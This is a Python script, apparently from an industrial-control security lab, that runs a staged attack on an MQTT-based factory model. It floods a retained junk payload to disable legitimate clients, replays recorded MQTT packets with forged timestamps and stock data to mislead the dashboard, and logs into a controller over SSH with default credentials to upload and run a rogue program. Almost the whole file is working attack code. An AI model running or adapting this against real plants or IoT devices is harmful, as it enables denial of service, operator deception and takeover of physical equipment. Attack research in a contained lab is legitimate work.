from datetime import datetime, timezone
import json
import re
import logging
import asyncio
import aiomqtt
import globs
import sqlite3
import time
from paramiko import SSHClient
from paramiko.client import AutoAddPolicy
from scp import SCPClient
import random


# # change event loop policy given a Windows machine. ref: https://sbtinstruments.github.io/aiomqtt/index.html#note-for-windows-users
# asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())

logger = logging.getLogger("attack_order")
logging.basicConfig(format="%(asctime)s - %(levelname)s - %(message)s", level=logging.DEBUG)

# suppress needless logging info from imported modules
logging.getLogger("paramiko").setLevel(logging.WARNING)
logging.getLogger("asyncio").setLevel(logging.WARNING)

IP_ADDRESS = '192.168.0.10'
PORT = 1883


def state(active, code, description="", station="vgr", target=None):
    if target is None:
        data = '{\n\t"active" : %s,\n\t"code" : %s,\n\t"description" : "%s",\n\t' \
               '"station" : "%s",\n\t' % (active, code, description, station)
        data += new_ts() + "\n}"
    else:
        data = '{\n\t"active" : %s,\n\t"code" : %s,\n\t"description" : "%s",\n\t' \
           '"station" : "%s",\n\t"target" : "%s",\n\t' % (active, code, description, station, target)
        data += new_ts() + "\n}"
    return data


def new_ts():
    # function to generate new timestamps
    ts = datetime.now(timezone.utc).strftime('%Y-%m-%dT%H:%M:%S.%f')[:-3] + 'Z'
    ts = f'"ts" : "{ts}"'
    return ts


def retrieve_from_stock(color: str, stock: str) -> str:
    stock = json.loads(stock)

    desired_order = ["C1", "B1", "A1", "C2", "B2", "A2", "C3", "B3", "A3"]
    ordered_stock_items = sorted(stock["stockItems"], key=lambda x: desired_order.index(x["location"]))

    for item in ordered_stock_items:
        if item['workpiece'] and item['workpiece']['type'] == color:
            globs.wp_location = item['location']
            globs.wp_id = item['workpiece']['id']
            item['workpiece'] = None
            break

    updated_stock = json.dumps(stock, indent=4).replace("    ", "\t").replace(": ", " : ")
    updated_stock_with_ts = re.sub(r'"ts"\s*:.*Z"', new_ts(), updated_stock)

    # since a bytes object gets passed into the function, we want to ensure a bytes object gets returned too
    return updated_stock_with_ts


def retrieve_from_db(table_name):
    conn = sqlite3.connect("fl_mqtt.sqlite")
    cursor = conn.cursor()

    cursor.execute(f"""SELECT time_delta_from_previous, mqtt_qos, mqtt_topic, mqtt_payload FROM {table_name}""")
    fetched = cursor.fetchall()

    return fetched


async def dos_leg_clients(client):
    dirty_payload = "70f11c4bfc1950f14ae8cf8d0800450000b231f44000400686eac0a8000dc0a8000a831a075bcf497a748c6e9d2f80180391640200000101080a00084a"

    await client.publish("f/o/state/ack", dirty_payload, qos=1, retain=True)


async def ssh_attack():
    await asyncio.sleep(random.randint(27, 35))

    # supress logging info from paramiko
    logging.getLogger("paramiko").setLevel(logging.WARNING)

    logger.info("Starting file upload attack on target VGR")
    server = '192.168.0.13'
    port = 22
    username = password = 'ROBOPro'

    # create ssh object and connect
    ssh = SSHClient()
    ssh.load_host_keys('/home/kali/.ssh/known_hosts')
    ssh.set_missing_host_key_policy(AutoAddPolicy)
    ssh.connect(server, port, username, password, look_for_keys=False, allow_agent=False)

    # hijack the established tcp/ssh connection and copy files
    scp = SCPClient(ssh.get_transport())
    path = '/home/kali/fischer/vgr/C-Program/'
    # now copy the rogue program
    scp.put(f'{path}TxtParkPosVGR', '.')
    path2 = '/home/kali/fischer/vgr/Data/Config.ParkPos.json'
    scp.put(f'{path2}', 'Data/')

    # now run the rogue program
    ssh.exec_command('./TxtParkPosVGR')
    time.sleep(2)
    ssh.connect(server, port, username, password, look_for_keys=False, allow_agent=False)
    ssh.exec_command('./TxtParkPosVGR')
    logging.info("Connected via SCP/SSH. Attack program uploaded and executed on target VGR.")


async def publish_state_10_seconds(client):
    while True:
        if globs.send_state_every_10_seconds_trigger:
            payload = state(0, 1, "", "vgr", "hbw")
            await client.publish("f/i/state/vgr", payload, qos=1)

            payload = state(0, 1, "", "hbw")
            await client.publish("f/i/state/hbw", payload, qos=1)

            while globs.HBW_STOCK is None:
                continue
            payload = globs.HBW_STOCK
            await client.publish("f/i/stock", payload, qos=1)

            payload = state(0, 1, "", "mpo")
            await client.publish("f/i/state/mpo", payload, qos=1)

            payload = state(0, 1, "", "sld")
            await client.publish("f/i/state/sld", payload, qos=1)

            await asyncio.sleep(10)
        else:
            await asyncio.sleep(2)

async def mass_publish(client, db_packets):
    # now we begin replaying our stored packets, but first ....
    for wait_time, mqtt_qos, mqtt_topic, mqtt_payload in db_packets[1:]:  # skip first f/o/order packet
        org = mqtt_payload
        # .... we need to change timestamp in db mqtt_payload
        mqtt_payload = re.sub(r'"ts"\s*:.*Z"', new_ts(), mqtt_payload)

        # .... we need to update the wp color/type
        mqtt_payload = re.sub(r'"type"\s*:.*"', f'"type" : "{globs.order_color}"', mqtt_payload)

        # .... we need to update the wp id
        # we use an if condition to avoid messing with cases where there is an empty id., i.e: "id" : ""
        if not re.search(r'"id"\s*:\s*""', mqtt_payload):
            mqtt_payload = re.sub(r'"id"\s*:.*"', f'"id" : "{globs.wp_id}"', mqtt_payload)

        # .... update stock
        if mqtt_topic == "f/i/stock":
            mqtt_payload = globs.HBW_STOCK

        # now be with publishing, before each publish, we wait for time_delta_previous from our db
        # we send out packets 0.15 seconds earlier to cover for network I/O delay
        # alternatively, we can just send throughout with qos 0 and get reach of the if condition
        if float(wait_time) >= 0.1:
            await asyncio.sleep(float(wait_time)-0.1)
        await client.publish(mqtt_topic, mqtt_payload, qos=int(mqtt_qos))

    logger.info("Waiting for attack to finish, almost there")


async def main():

    async with aiomqtt.Client(IP_ADDRESS, port=PORT) as client:
        # start a coroutine that runs concurrently our logic to publish FL state information every 10 seconds
        asyncio.create_task(publish_state_10_seconds(client))

        # subscription to topics of interest
        await client.subscribe("f/i/stock", qos=1)
        await client.subscribe("f/o/order", qos=1)
        logger.info("Subscription to all topics of interest done")

        async for message in client.messages:
            try: mqtt_payload = json.loads(message.payload)
            except json.decoder.JSONDecodeError as error: pass # logger.debug(f"{error}\n{message.topic}\n{message.payload}")

            if message.topic.matches("f/i/stock") and not globs.is_stock_recorded:
                globs.HBW_STOCK = message.payload
                globs.is_stock_recorded = True
                logger.debug("Stock recorded")

                await dos_leg_clients(client)
                logger.info("Broadcast attack done. Legitimate clients now shut down")
                logger.info("Listening for order")

            if message.topic.matches("f/o/order"):
                # await client.unsubscribe("f/i/stock")

                logger.info("Order received from Dashboard via broker")
                globs.is_order_received = True
                globs.order_color = mqtt_payload['type']
                globs.send_state_every_10_seconds_trigger = False
                logger.info("Ordered color is: " + globs.order_color)

                # we retrieve the legitimate current stock from the real HBW, and begin our attack from there
                logger.info("Retrieving order WP from Stock")
                globs.HBW_STOCK = retrieve_from_stock(globs.order_color, globs.HBW_STOCK)
                logger.info("Order successfully retrieved from Stock")

                # publish fake stock right away to update order page
                await client.publish("f/i/stock", globs.HBW_STOCK, qos=1)

                # we then retrieve our stored packets from the DB so we can replay that
                retrieved_packets = retrieve_from_db(globs.wp_location)

                # start a coroutine that runs our ssh_attack logic concurrently
                asyncio.create_task(ssh_attack())

                # once packets have been retrieved, we now call the mass_publish to begin publishing packets
                await mass_publish(client, retrieved_packets)

                logger.info(
                    "First run of attack done. Now sending idle status information to user while listening for new order.")
                globs.send_state_every_10_seconds_trigger = True
                globs.is_stock_recorded = False
                logger.debug("Done")

asyncio.run(main())
